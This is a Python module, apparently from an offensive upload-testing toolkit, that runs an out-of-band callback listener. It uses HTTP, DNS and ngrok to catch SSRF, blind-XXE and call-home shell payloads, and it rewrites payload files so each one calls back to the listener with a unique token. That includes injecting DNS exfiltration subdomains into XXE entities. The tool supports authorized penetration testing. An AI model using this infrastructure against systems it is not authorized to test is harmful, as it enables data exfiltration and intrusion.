"""Out-of-band callback listener.

Catches the HTTP (and, with a public IP, DNS) hits produced by SSRF, blind
XXE, SVG-SSRF and call-home shell payloads, then marks the manifest with which
payload fired.

Two deployment shapes are supported, because that is how testing actually
happens:

* **Home / behind NAT — ngrok.** The listener detects a running ngrok agent
  through its local API (``http://127.0.0.1:4040/api/tunnels``) and uses the
  public ``https://*.ngrok…`` URL as the callback host. If no tunnel is up and
  an ``ngrok`` binary is on PATH, it can start one (``--ngrok``).
* **VPS with a public IP.** Bind on ``0.0.0.0`` and advertise the public
  address (auto-detected or ``--public-host``).

HONEST LIMITATION (ngrok): ngrok's free HTTP tunnel forwards **HTTP only**.
HTTP-based OOB — classic SSRF, SVG-SSRF, and the blind-XXE ``evil.dtd`` that
exfiltrates over ``http://host/?x=…`` — works fine. A *DNS-only* callback
(a resolver looking up ``token.attacker.tld``) does **not** traverse an ngrok
HTTP tunnel: DNS needs a real public IP plus an NS-delegated domain. The tool
says so loudly rather than pretending, and `--dns` is refused in ngrok mode.

To make every hit unambiguous, ``--arm`` rewrites the callback URLs inside the
OOB payloads on disk so each carries a unique token (``/uaXXXXXXXXXX/…``); the
token is stored in the manifest, so an incoming request maps to exactly one
payload. Without arming, hits are matched by request path as a best effort.

Authorized testing only. Bind to interfaces/ports you control.
"""
from __future__ import annotations

import argparse
import datetime as _dt
import http.server
import json
import os
import re
import socket
import socketserver
import sys
import threading
import urllib.request

from ..manifest import Manifest, ManifestEntry, callback_token


# --------------------------------------------------------------------------- #
# ngrok
# --------------------------------------------------------------------------- #
NGROK_API = "http://127.0.0.1:4040/api/tunnels"


def ngrok_public_url(api: str = NGROK_API, timeout: float = 3.0) -> str | None:
    """Return the public HTTPS URL of a running ngrok HTTP tunnel, or None."""
    try:
        with urllib.request.urlopen(api, timeout=timeout) as r:  # noqa: S310 (localhost)
            doc = json.load(r)
    except (OSError, ValueError):
        return None
    tunnels = doc.get("tunnels", [])
    # Prefer an https tunnel; fall back to any.
    https = [t for t in tunnels if str(t.get("public_url", "")).startswith("https")]
    chosen = (https or tunnels)
    return chosen[0]["public_url"] if chosen else None


def start_ngrok(port: int, timeout: float = 15.0):
    """Start `ngrok http <port>` if the binary exists; return (proc, url)."""
    import shutil
    import subprocess
    import time

    binary = shutil.which("ngrok")
    if not binary:
        raise RuntimeError("ngrok binary not found on PATH; start it manually "
                           "with `ngrok http %d` or pass --public-host" % port)
    proc = subprocess.Popen(
        [binary, "http", str(port), "--log", "stdout"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        url = ngrok_public_url()
        if url:
            return proc, url
        time.sleep(0.5)
    proc.terminate()
    raise RuntimeError("ngrok started but no tunnel appeared within %ss; check "
                       "`ngrok http %d` manually" % (timeout, port))


def public_ip() -> str | None:
    """Best-effort public IP of this host (for VPS mode)."""
    for url in ("https://api.ipify.org", "https://ifconfig.me/ip",
                "https://ipv4.icanhazip.com"):
        try:
            with urllib.request.urlopen(url, timeout=4) as r:  # noqa: S310
                ip = r.read().decode().strip()
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
                return ip
        except OSError:
            continue
    # local fallback
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return None


# --------------------------------------------------------------------------- #
# Shared hit registry
# --------------------------------------------------------------------------- #
_TOKEN_RE = re.compile(r"ua[0-9a-f]{10}")


class Registry:
    """Thread-safe store mapping tokens -> manifest entries, and recording hits."""

    def __init__(self, manifest: Manifest | None, logfile: str | None,
                 on_hit=None):
        self.manifest = manifest
        self.logfile = logfile
        self.on_hit = on_hit
        self.lock = threading.Lock()
        self.hits: list = []
        self.token_map: dict = {}
        if manifest:
            for e in manifest.entries:
                self.token_map[callback_token(e)] = e

    def record(self, kind: str, meta: dict) -> ManifestEntry | None:
        """Record a hit; return the matched manifest entry if any."""
        blob = " ".join(str(v) for v in meta.values())
        entry = None
        token = None
        for tok in _TOKEN_RE.findall(blob):
            if tok in self.token_map:
                entry, token = self.token_map[tok], tok
                break
        if entry is None and self.manifest:
            entry = self._match_by_path(meta.get("path", ""))
        hit = {
            "time": _dt.datetime.now(_dt.timezone.utc).isoformat(),
            "kind": kind, "token": token,
            "payload": entry.path if entry else None, **meta,
        }
        with self.lock:
            self.hits.append(hit)
            if entry is not None:
                cb = dict(entry.callback)
                cb["kind"] = kind
                cb["count"] = cb.get("count", 0) + 1
                cb["last"] = hit["time"]
                cb.setdefault("source", meta.get("source"))
                entry.callback = cb
                if self.manifest:
                    self.manifest.save()
            if self.logfile:
                with open(self.logfile, "a") as f:
                    f.write(json.dumps(hit) + "\n")
        if self.on_hit:
            self.on_hit(hit, entry)
        return entry

    def _match_by_path(self, path: str) -> ManifestEntry | None:
        """Best-effort match of an un-armed hit to a payload by request path."""
        if not path:
            return None
        hints = {
            "svg-ssrf": "svg-xxe", "xxe-ssrf": "xxe", "evil.dtd": "xxe",
            "mvg": "imagemagick", "image.jpg": "imagemagick",
        }
        for needle, technique in hints.items():
            if needle in path:
                for e in self.manifest.entries:
                    if e.technique == technique:
                        return e
        return None


# --------------------------------------------------------------------------- #
# HTTP listener
# --------------------------------------------------------------------------- #
class _Handler(http.server.BaseHTTPRequestHandler):
    registry: Registry = None            # set on the server
    server_version = "nginx"             # look boring on the wire
    sys_version = ""

    def _handle(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length else b""
        meta = {
            "source": self.client_address[0],
            "method": self.command,
            "path": self.path,
            "host": self.headers.get("Host", ""),
            "user_agent": self.headers.get("User-Agent", ""),
            "body": body[:2048].decode("utf-8", "replace"),
        }
        self.registry.record("http", meta)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

    do_GET = do_POST = do_PUT = do_HEAD = do_OPTIONS = _handle

    def log_message(self, *a):           # silence default stderr spam
        pass


class _ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def serve_http(bind: str, port: int, registry: Registry) -> _ThreadingHTTPServer:
    handler = type("Handler", (_Handler,), {"registry": registry})
    srv = _ThreadingHTTPServer((bind, port), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


# --------------------------------------------------------------------------- #
# DNS listener (public-IP / VPS mode only)
# --------------------------------------------------------------------------- #
def _dns_parse_qname(data: bytes) -> str | None:
    try:
        idx = 12
        labels = []
        while True:
            ln = data[idx]
            if ln == 0:
                break
            labels.append(data[idx + 1:idx + 1 + ln].decode("latin-1", "replace"))
            idx += 1 + ln
        return ".".join(labels)
    except (IndexError, ValueError):
        return None


def _dns_response(data: bytes, answer_ip: str | None) -> bytes:
    """Minimal DNS reply echoing the question; answers with answer_ip if set."""
    tid = data[:2]
    flags = b"\x81\x80"                   # standard response, no error
    qd = data[4:6]
    # find end of question
    idx = 12
    while data[idx] != 0:
        idx += 1 + data[idx]
    idx += 1 + 4                          # null + qtype + qclass
    question = data[12:idx]
    if not answer_ip:
        header = tid + b"\x81\x83" + qd + b"\x00\x00" + b"\x00\x00" + b"\x00\x00"
        return header + question          # NXDOMAIN-ish, still logged
    an = b"\x00\x01"
    header = tid + flags + qd + an + b"\x00\x00" + b"\x00\x00"
    rr = (b"\xc0\x0c" + b"\x00\x01" + b"\x00\x01" + b"\x00\x00\x00\x3c"
          + b"\x00\x04" + socket.inet_aton(answer_ip))
    return header + question + rr


def serve_dns(bind: str, port: int, registry: Registry,
              answer_ip: str | None) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((bind, port))

    def loop():
        while True:
            try:
                data, addr = sock.recvfrom(4096)
            except OSError:
                return
            qname = _dns_parse_qname(data)
            registry.record("dns", {"source": addr[0], "qname": qname or "",
                                    "path": qname or ""})
            try:
                sock.sendto(_dns_response(data, answer_ip), addr)
            except OSError:
                pass

    threading.Thread(target=loop, daemon=True).start()
    return sock


# --------------------------------------------------------------------------- #
# Arming: inject per-payload tokens into OOB payloads on disk
# --------------------------------------------------------------------------- #
# Techniques that make an outbound callback we can tokenise.
OOB_CATEGORIES = {"xxe", "image-processing"}
OOB_SVG_TECHNIQUES = {"svg-xxe"}


def arm_manifest(man: Manifest, callback_host: str, *, dns_domain: str | None,
                 quiet: bool) -> int:
    """Rewrite OOB payloads so every callback URL points at `callback_host`
    and carries the payload's unique token. Returns the number armed.

    `callback_host` is a bare host[:port] (no scheme). The original payloads
    use the placeholder host baked in at generation (e.g. ATTACKER_HOST or a
    real host); we replace any http(s) URL host with callback_host/<token>.
    """
    armed = 0
    url_host_re = re.compile(
        r"(https?://)([A-Za-z0-9._\-]+(?::\d+)?)(/[^\s\"'<>)]*)?")
    for e in man.entries:
        is_oob = (e.category in OOB_CATEGORIES
                  or e.technique in OOB_SVG_TECHNIQUES)
        if not is_oob:
            continue
        path = man.artifact_path(e)
        try:
            with open(path, "rb") as f:
                raw = f.read()
        except OSError:
            continue
        text = raw.decode("utf-8", "surrogateescape")
        token = callback_token(e)

        def repl(m):
            scheme, _host, rest = m.group(1), m.group(2), m.group(3) or "/"
            if not rest.startswith("/"):
                rest = "/" + rest
            return f"{scheme}{callback_host}/{token}{rest}"

        new_text, n = url_host_re.subn(repl, text)
        # DNS exfil subdomain injection for blind XXE, when a domain is given.
        if dns_domain:
            new_text = new_text.replace(
                "%file;", f"%file;.{token}.{dns_domain}")
        if n or new_text != text:
            with open(path, "wb") as f:
                f.write(new_text.encode("utf-8", "surrogateescape"))
            armed += 1
            if not quiet:
                print(f"[arm] {e.path}  -> token {token}")
    man.save()
    return armed


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="upload-arsenal-callback",
        description="Listen for SSRF/XXE/shell out-of-band callbacks and mark "
                    "the manifest with which payload fired. Supports ngrok "
                    "(home/NAT) and public-IP/VPS deployments. Authorized use only.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Examples:\n"
               "  # VPS with a public IP, arm payloads then listen (HTTP+DNS):\n"
               "  upload-arsenal-callback -m suite --public-host 1.2.3.4 \\\n"
               "       --arm --dns --dns-domain oob.example.com\n\n"
               "  # Home box behind NAT via an already-running ngrok tunnel:\n"
               "  upload-arsenal-callback -m suite --use-ngrok --arm\n\n"
               "  # Let the tool start ngrok for you:\n"
               "  upload-arsenal-callback -m suite --ngrok --arm\n",
    )
    p.add_argument("-m", "--manifest",
                   help="index.json or suite dir (enables payload matching/arming)")
    p.add_argument("--http-port", type=int, default=8000,
                   help="local HTTP listener port (default: 8000)")
    p.add_argument("--bind", default="0.0.0.0",
                   help="interface to bind listeners on (default: 0.0.0.0)")
    p.add_argument("-o", "--log", help="append hits as JSON lines to this file "
                                       "(default: <suite>/callbacks.jsonl)")

    mode = p.add_argument_group("public reachability")
    mode.add_argument("--public-host",
                      help="public host[:port] reachable by the target (VPS). "
                           "If omitted and no ngrok, the public IP is auto-detected.")
    mode.add_argument("--use-ngrok", action="store_true",
                      help="use the public URL of an already-running ngrok tunnel "
                           "(queries http://127.0.0.1:4040)")
    mode.add_argument("--ngrok", action="store_true",
                      help="start `ngrok http <http-port>` and use its URL")
    mode.add_argument("--ngrok-api", default=NGROK_API,
                      help="ngrok local API (default: %(default)s)")

    dns = p.add_argument_group("DNS listener (public IP only)")
    dns.add_argument("--dns", action="store_true",
                     help="also run a DNS listener (needs a public IP + delegated "
                          "domain; NOT compatible with ngrok)")
    dns.add_argument("--dns-port", type=int, default=53)
    dns.add_argument("--dns-domain",
                     help="the NS-delegated domain pointed at this host, e.g. "
                          "oob.example.com (used when arming for DNS exfil)")
    dns.add_argument("--dns-answer",
                     help="A record to answer queries with (default: --public-host "
                          "if it is an IP)")

    p.add_argument("--arm", action="store_true",
                   help="rewrite OOB payloads so each callback URL carries this "
                        "host and a unique per-payload token (needs --manifest)")
    p.add_argument("-q", "--quiet", action="store_true")
    return p


def _resolve_callback_host(args) -> tuple[str, str, object]:
    """Return (callback_host, scheme, ngrok_proc_or_None).

    callback_host is host[:port] with no scheme; scheme is http/https.
    """
    proc = None
    if args.ngrok or args.use_ngrok:
        if args.dns:
            raise SystemExit("error: --dns cannot work through an ngrok HTTP "
                             "tunnel. DNS OOB needs a public IP + delegated "
                             "domain. Drop --dns, or deploy on a VPS with "
                             "--public-host.")
        url = ngrok_public_url(args.ngrok_api)
        if not url and args.ngrok:
            proc, url = start_ngrok(args.http_port)
        if not url:
            raise SystemExit("error: no ngrok tunnel found at %s. Start one with "
                             "`ngrok http %d` (then --use-ngrok) or pass --ngrok "
                             "to let me start it." % (args.ngrok_api, args.http_port))
        from urllib.parse import urlsplit
        u = urlsplit(url)
        return u.netloc, u.scheme, proc

    # VPS / public-IP mode.
    if args.public_host:
        host = args.public_host
    else:
        ip = public_ip()
        if not ip:
            raise SystemExit("error: could not determine a public host; pass "
                             "--public-host or use --ngrok.")
        host = f"{ip}:{args.http_port}" if args.http_port != 80 else ip
    return host, "http", None


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    man = Manifest.load(args.manifest) if args.manifest else None

    callback_host, scheme, ngrok_proc = _resolve_callback_host(args)
    public_url = f"{scheme}://{callback_host}"

    logfile = args.log or (os.path.join(man.root, "callbacks.jsonl") if man else None)

    def on_hit(hit, entry):
        if args.quiet:
            return
        who = hit.get("payload") or "unmatched"
        extra = hit.get("qname") or hit.get("path", "")
        print(f"[HIT] {hit['kind']:4} from {hit['source']:15} {who:40} {extra}")

    registry = Registry(man, logfile, on_hit=on_hit)

    if args.arm:
        if not man:
            return _die("--arm needs --manifest")
        n = arm_manifest(man, callback_host, dns_domain=args.dns_domain,
                         quiet=args.quiet)
        if not args.quiet:
            print(f"[+] armed {n} OOB payload(s) to call back to {public_url}")

    http_srv = serve_http(args.bind, args.http_port, registry)

    dns_sock = None
    if args.dns:
        answer = args.dns_answer
        if not answer and args.public_host and re.match(
                r"^\d{1,3}(\.\d{1,3}){3}$", args.public_host.split(":")[0]):
            answer = args.public_host.split(":")[0]
        dns_sock = serve_dns(args.bind, args.dns_port, registry, answer)

    if not args.quiet:
        print("=" * 68)
        print(f"[*] callback host : {public_url}")
        print(f"[*] HTTP listener : {args.bind}:{args.http_port}")
        if dns_sock:
            print(f"[*] DNS listener  : {args.bind}:{args.dns_port}"
                  + (f"  (A -> {args.dns_answer or args.public_host})"
                     if (args.dns_answer or args.public_host) else ""))
            if args.dns_domain:
                print(f"[*] DNS domain    : *.{args.dns_domain}")
        if ngrok_proc:
            print("[*] ngrok         : started by this tool")
        elif args.use_ngrok:
            print("[*] ngrok         : using existing tunnel")
        if (args.ngrok or args.use_ngrok):
            print("[!] ngrok carries HTTP only — DNS-only OOB will NOT arrive. "
                  "HTTP SSRF/XXE/evil.dtd exfil works.")
        if logfile:
            print(f"[*] logging to    : {logfile}")
        if man:
            print("[*] regenerate the suite with  --callback-host %s  "
                  "(or use --arm) so payloads point here." % callback_host)
        print("[*] Ctrl-C to stop.")
        print("=" * 68)

    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        if not args.quiet:
            print(f"\n[=] {len(registry.hits)} hit(s) recorded.")
            matched = sorted({h['payload'] for h in registry.hits if h['payload']})
            for p_ in matched:
                print(f"    fired: {p_}")
    finally:
        http_srv.shutdown()
        if dns_sock:
            dns_sock.close()
        if ngrok_proc:
            ngrok_proc.terminate()
    return 0


def _die(msg: str) -> int:
    print(f"error: {msg}", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
